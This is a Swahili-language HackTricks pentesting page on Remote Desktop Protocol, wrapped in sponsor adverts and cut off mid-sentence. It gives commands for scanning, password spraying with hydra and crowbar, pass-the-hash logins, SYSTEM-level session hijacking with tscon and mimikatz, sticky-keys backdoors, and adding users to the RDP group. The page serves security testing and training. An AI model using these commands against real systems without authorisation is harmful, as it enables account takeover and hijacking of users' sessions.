# 3389 - Kupima Usalama wa RDP

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**Mazingira yanayopatikana mara moja kwa upimaji wa udhaifu & kupenyeza**. Tekeleza pentest kamili kutoka mahali popote na zana & vipengele zaidi ya 20 vinavyoanzia uchunguzi hadi ripoti. Hatuchukui nafasi ya wapima usalama - tunatengeneza zana za desturi, moduli za ugunduzi & uchomaji ili kuwarudishia muda wa kuchimba kwa kina, kufungua mabakuli, na kufurahi.

{% embed url="https://pentest-tools.com/" %}

## Taarifa Msingi

Iliyoundwa na Microsoft, **Itifaki ya Desktop ya Mbali** (**RDP**) imeundwa kuruhusu uhusiano wa interface ya picha kati ya kompyuta kupitia mtandao. Ili kuanzisha uhusiano kama huo, programu ya mteja wa **RDP** hutumiwa na mtumiaji, na kwa wakati huo huo, kompyuta ya mbali inahitajika kuendesha programu ya **RDP** ya seva. Hii inaruhusu kudhibiti na kupata kwa urahisi mazingira ya desktop ya kompyuta ya mbali, ikileta interface yake kwa kifaa cha mtumiaji kwa karibu.

**Bandari ya msingi:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Uchambuzi

### Kiotomatiki

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

Inachunguza usimbaji wa data uliopo na udhaifu wa DoS (bila kusababisha DoS kwa huduma) na kupata habari za NTLM Windows (toleo).

### [Brute force](../generic-methodologies-and-resources/brute-force.md#rdp)

**Jihadhari, unaweza kufunga akaunti**

### **Password Spraying**

**Jihadhari, unaweza kufunga akaunti**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Unganisha na sifa/hash inayojulikana
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Angalia sifa zilizojulikana dhidi ya huduma za RDP

rdp\_check.py kutoka impacket inakuwezesha kuangalia ikiwa baadhi ya sifa ni halali kwa huduma ya RDP:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**Mipangilio inapatikana mara moja kwa tathmini ya udhaifu & upenyezaji**. Tekeleza pentest kamili kutoka popote uendapo na zana na vipengele zaidi ya 20 vinavyoanzia uchunguzi hadi ripoti. Hatuchukui nafasi ya wapimaji wa pentest - tunatengeneza zana za desturi, ugunduzi & moduli za uchexploitation ili kuwapa muda wa kuchimba kwa kina, kufungua makompyuta, na kufurahia.

{% embed url="https://pentest-tools.com/" %}

## **Mashambulizi**

### Wizi wa Kikao

Kwa **ruhusa za SYSTEM** unaweza kupata kikao cha **RDP kilichofunguliwa na mtumiaji yeyote** bila haja ya kujua nywila ya mmiliki.

**Pata vikao vilivyofunguliwa:**
```
query user
```
**Upatikanaji wa kikao kilichochaguliwa**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Sasa utakuwa ndani ya kikao cha RDP kilichochaguliwa na utalazimika kujifanya kuwa mtumiaji kwa kutumia zana na vipengele vya Windows pekee.

**Muhimu**: Unapopata ufikiaji wa vikao vya RDP vilivyopo utamfukuza mtumiaji aliyekuwa akitumia.

Unaweza kupata nywila kutoka kwa mchakato wa kudumpi, lakini njia hii ni haraka sana na itakuruhusu kuingiliana na desktopi za vitu vya mtumiaji (nywila kwenye notepad bila kuokolewa kwenye diski, vikao vingine vya RDP vilivyofunguliwa kwenye mashine nyingine...)

#### **Mimikatz**

Unaweza pia kutumia mimikatz kufanya hivi:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Vipindi vya Sticky-keys & Utilman

Kwa kuchanganya mbinu hii na **stickykeys** au **utilman utaweza kufikia CMD ya utawala na kikao chochote cha RDP wakati wowote**

Unaweza kutafuta RDP ambazo tayari zimeingiliwa na moja ya mbinu hizi kwa kutumia: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### Uingizaji wa Mchakato wa RDP

Ikiwa mtu kutoka kwenye uwanja tofauti au mwenye **mamlaka bora anajisajili kupitia RDP** kwenye PC ambapo **wewe ni Msimamizi**, unaweza **kuingiza** ishara yako katika **mchakato wake wa kikao cha RDP** na kufanya kazi kama yeye:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Kuongeza Mtumiaji kwenye Kikundi cha RDP
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Zana za Kiotomatiki

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn** ni mfumo wa baada ya uchimbaji ulioandikwa kwa Powershell, ulioundwa kimsingi kwa ajili ya kiotomatiki cha shambulio la **Shadow** kwenye kompyuta za Microsoft Windows. Udhaifu huu (uliouorodheshwa kama kipengele na Microsoft) huruhusu mshambuliaji wa mbali **kuona desktop ya mwathiriwa wake bila idhini yake**, na hata kuudhibiti kwa mahitaji, kwa kutumia zana zilizojengwa kwenye mfumo wa uendeshaji yenyewe.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* Udhibiti wa panya na kibodi kiotomatiki kutoka kwenye mstari wa amri
* Udhibiti wa ubao wa kunakili kiotomatiki kutoka kwenye mstari wa amri
* Kuchochea proxi ya SOCKS kutoka kwa mteja ambayo inaelekeza mawasiliano ya mtandao kwenye lengo kupitia RDP
* Kutekeleza amri za SHELL na PowerShell za kiholela kwenye lengo bila kupakia faili
* Pakia na pakua faili kwenye/ kutoka kwenye lengo hata wakati uhamishaji wa faili umezimwa kwenye lengo

## Amri za Kiotomatiki za HackTricks
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**Mipangilio inapatikana mara moja kwa tathmini ya udhaifu na upenyezaji**. Tekeleza pentest kamili kutoka popote ukiwa na zana na vipengele zaidi ya 20 vinavyoanzia uchunguzi hadi ripoti. Hatuchukui nafasi ya wapimaji wa pentest - tuna
